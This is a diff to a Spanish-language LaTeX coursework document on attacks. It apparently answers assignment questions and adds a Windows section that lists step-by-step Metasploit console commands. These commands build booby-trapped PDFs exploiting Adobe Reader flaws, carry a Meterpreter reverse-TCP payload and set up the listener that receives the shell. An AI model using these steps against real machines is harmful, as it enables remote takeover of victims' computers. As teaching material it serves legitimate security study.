@@ -134,6 +134,8 @@ Una acción de concientización interesante podría ser la demostración de qué
 
 \section{Ataques}
 
+\subsection{Android}
+
 \emph{Explique el procedimiento para la ejecución del componente meterpreter en un dispositivo/computadora remoto/a a través de msfvenom} 
 
 Para poder ejecutar una aplicación con un \emph{shell reverso \footnote{Se establece una conexión entre dos computadoras, la que inicia la conexión dirige una terminal interactiva hacía el destino \autocite{ReverseShell}}} en un dispositivo Android, primero se debe crear un archivo \emph{.apk} (archivo instalable en un Android) que contenga el código necesario para establecer la conexión con otra computadora. Para ello se usa el programa \texttt{msfvenom} de la siguiente manera:
@@ -164,13 +166,49 @@ Una vez instalada la aplicación en el dispositivo Android al cual se desea atac
     \caption{Conexión desde \texttt{msfconsole} a un dispositivo Android}
 \end{figure}
 
+\subsection{Windows}
 
+\emph{Basado en ejemplo aterior, como realizaría el mismo ataque contra un equipo Microsoft Windows. Puede utilizar un archivo PDF como vector de ataque} 
 
+Dentro de la suite de programas de Adobe, uno de los más usado es su lector de PDFs, \textbf{Adobe Reader}. Este programa posee varias vulnerabilidades de las cuales uno se puede aprovechar para inyectar código malicioso en un archivo PDF. De las vulnerabilidades disponibles, a continuación se mostrará cómo explotar dos de ellas disponibles en Metasploit.
 
+La primera de ellas, se trata de un \emph{desbordamiento del buffer} (\emph{buffer overflow}) de la pila de funciones de JavaScript con la función \texttt{util.printf()} \autocite{JSStackBufferOverflow}. Para inyectar el código en el archivo PDF se debe ejecutar los siguientes comandos en la consola de \texttt{msfconsole}:
 
+\begin{itemize}
+    \item \texttt{use exploit/windows/fileformat/adobe\_utilprintf}
+    \item \texttt{set FILENAME <NOMBRE\_DEL\_ARCHIVO>.pdf}
+    \item \texttt{set payload windows/meterpreter/reverse\_tcp}
+    \item \texttt{set LHOST <IP>}
+    \item \texttt{set LPORT <PUERTO\_DE\_ESCUCHA>} 
+    \item \texttt{exploit} 
+\end{itemize}
 
+Como se puede ver en los comandos, se está agregando un \emph{payload} que establece una conexión TCP con una computadora que estará esperando tal conexión. De esta forma, al igual que con el ataque a un dispositivo Android, establecemos una \emph{shell reversa}. 
 
+Una vez creado el archivo PDF y abierto en la máquina que será la víctima, se deben realizar los mismos pasos que en el ataque a Android para conectarse con el dispositivo, pero cambiando el \emph{payload} 
 
+\begin{itemize}
+    \item \texttt{use exploit/multi/handler} 
+    \item \texttt{set payload windows/meterpreter/reverse\_tcp} 
+    \item \texttt{set LHOST <IP>} 
+    \item \texttt{set LPORT <PUERTO\_DE\_ESCUCHA>} 
+    \item \texttt{exploit} 
+\end{itemize}
+
+La segunda vulnerabilidad a experimentar se puede hallar en Metasploit como \dq{Adobe PDF Embedded} \autocite{AdobePDFEmbedded}. Los pasos para inyectarla en un archivo PDF muy similares a los realizados con la anterior.
+
+Primero, se debe armar el PDF. Para ello, se necesita un archivo PDF de entrada, al cual inyectarle el \emph{payload}. Desde la consola de \texttt{msfconsole}, ejecutar los siguientes comandos:
+\begin{itemize}
+    \item \texttt{use exploit/windows/fileformat/adobe\_pdf\_embedded\_exe} 
+    \item \texttt{set payload windows/meterpreter/reverse\_tcp} 
+    \item \texttt{set INFILENAME <ARCHIVO\_ENTRADA.pdf} 
+    \item \texttt{set FILENAME <ARCHIVO\_SALIDA.pdf} 
+    \item \texttt{set LHOST <IP>} 
+    \item \texttt{set LPORT <PUERTO\_DE\_ESCUCHA>} 
+    \item \texttt{exploit} 
+\end{itemize}
+
+Creado el archivo, es cuestión de abrir en la máquina objetivo y configurar una máquina a la cual se conectará la primera (el procedimiento es el mismo a la vulnerabilidad anterior).
 
 
 
@@ -181,4 +219,3 @@ Una vez instalada la aplicación en el dispositivo Android al cual se desea atac
 \printbibliography
 
 \end{document}
-
